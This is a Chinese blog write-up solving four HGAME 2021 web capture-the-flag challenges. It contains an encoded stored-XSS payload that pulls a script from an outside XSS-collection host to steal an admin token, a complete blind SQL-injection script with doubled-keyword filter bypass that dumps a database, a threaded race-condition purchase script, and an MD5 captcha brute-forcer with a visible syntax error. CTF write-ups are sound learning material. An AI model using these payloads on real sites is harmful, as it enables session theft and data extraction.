---
title: HGAME-Web-Week2WP
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-02-13 20:20:38
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1128240.png
---
一、LazyDogR4U

www.zip源码泄露

一个session变量覆盖

获取flag的条件：
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207002347.png)

继续看到flag.php包含的lazy.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207002638.png)

此代码自行理解，建议本地试一试。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210207003044.png)

    hgame{R4U~|S-4~lazy-DoG}

二、Post to zuckonit

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208194730.png)

经典xss，要获取管理员的token访问/flag。
找一个xss平台准备接收token
payload：

    <iframe srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#112;&#116;&#47;&#87;&#106;&#52;&#67;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>

xss就不解释了，一是姿势非常多，二是我自己也没怎么遇到过（啥也不会）

payload准备好之后打给后台机器人就行，这里还有个验证码，python跑一个就行，网上嫖的脚本 稍微改了下（#py2）：

    import hashlib
    import random

    def encryption(chars):
         return hashlib.md5(chars).hexdigest()
    def generate():
      code = ""
      for i in range(5):
          add_num = str(random.randrange(0,9))#纯数字
          add_al = chr(random.randrange(65,91))#纯大写字母
          add_str = str(random.randrange(0,9)) + chr    (random.randrange(65,91))#数字和字母
          sj = random.choice([add_str])
          code = "".join([sj,code])
      return code
    def main():
         start = "6a506f" #指定前六位
         while True:
             strs = generate()
             print "Test %s " % strs
             if encryption(strs).startswith(start):
                 print "yes!"
                 print "[+] %s " % strs + "%s " % encryption(strs)
             break
             else:
                 print "no!"

    if __name__ == '__main__':
         main()
         print '完成！'

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208195933.png)

拿到token，访问/flag

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208200006.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208200142.png)

三、200OK!!

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209120259.png)

乍一看不知道是考的啥东西，抓个包康康（burp抓https教程自行百度）：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209120429.png)

在js脚本里面可以看到Status是随机生成的，在这里是一个可以控制的点，大概率存在sql注入。因为sql注入是寒假任务之一，所以我这里就一步一步写的细一点。

首先测试闭合的方式，1'时无回显，1'#时有回显，所以是单引号型的。

接下来我直接试了异或注入（记得加单引号，因为后台语句大概是这样的：select '(你的输入)'）：1'^'1'^'1'#

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209121137.png)

成功执行，存在异或注入。然后就是直接上二分法脚本了。

我先放脚本：


    import requests
    
    flag = ""
    url = "https://200ok.liki.link/server.php"
    for i in range(1,1000):
        l = 32
        h = 132
        mid = (l + h) // 2
        while(l<h):
            #payload = "1'^(ord(mid(database(),{0},1))>{1})^'1'#".format(i, mid) #库名为 week2sqli
            #payload = "1'^(ord(mid((selselectect(group_concat(table_name))frfromom(information_schema.tables)wwherehere(table_schema='week2sqli')),{0},1))>{1})^'1'#".format(i, mid) #表名为f1111111144444444444g
            #payload = "1'^(ord(mid((selselectect(group_concat(column_name))frfromom(information_schema.columns)wwherehere(table_name='f1111111144444444444g')),{0},1))>{1})^'1'#".format(i, mid) #列名为ffffff14gggggg
            payload = "1'^(ord(mid((selselectect(group_concat(ffffff14gggggg))frfromom(week2sqli.f1111111144444444444g)),{0},1))>{1})^'1'#".format(i, mid) #列名为ffffff14gggggg
    
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
                'Status': payload
            }
            r = requests.get(url=url,headers=headers)
            print(r.text)
            if 'NETWORK ERROR' in r.text:
                l = mid + 1
            else:
                h = mid
            #if (mid == 32 or mid == 132):
               # break
            mid = (l + h) // 2
        flag += chr(mid)
        print(flag)
    print(flag)

二分法脚本做buu的应该都已经遇到过了，所以就不细说了。唯一要说明的就是双写绕过以及是如何判断waf的。

在测试脚本的时候，我成功执行了第一个payload爆出了库名，于是直接进行了下一步爆表名，但是没有回显，测试payload如下：

    payload = 1'^(ord(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='week2sqli')),1,1))>1)^'1'#

照理说表名第一位的ascii码肯定大于一，所以这里应该返回NETWORK ERROR，但是却连200 OK都没有，所以肯定是语句存在问题了，而且是与第一个payload不一样的地方。

于是得一个个地测试，这里我用了length来判断：1'^(length('select')=0)^'1'#

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210209122031.png)

返回NETWORK ERROR，说明select长度为0，这也就表示了后台把select替换为空，所以双写绕过即可。from和where原理同上

hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)}

四、Liki的生日礼物
这题找了好久不知道洞在哪，但是看solve数量那么多应该是个很简单的题，果然就是个竞争。python多线程同时买26张券即可。
脚本:

    import requests
    import threading
    
    def buyswitch(n):
        url = "https://birthday.liki.link/API/?m=buy"
        data = {"amount": 26}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
            'Cookie': 'PHPSESSID=qdacrahf4gvn2o9q8aa4vm46jb' #改成你自己的
        }
        r = requests.post(url=url,headers=headers,data=data)
        print('线程'+ str(n) + ':' + str(r.status_code) )
        print (r.text)
    
    
    def thread(n):
        threads = []
        for i in range(0, n):
            t = threading.Thread(target=buyswitch, args=(i,))
            threads.append(t)
        print(threads)
    
        for t in threads:
            t.start()
        for t in threads:
            t.join()
    
    thread(2)


![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210208225903.png)


    hgame{L0ck_1s_TH3_S0lllut!on!!!}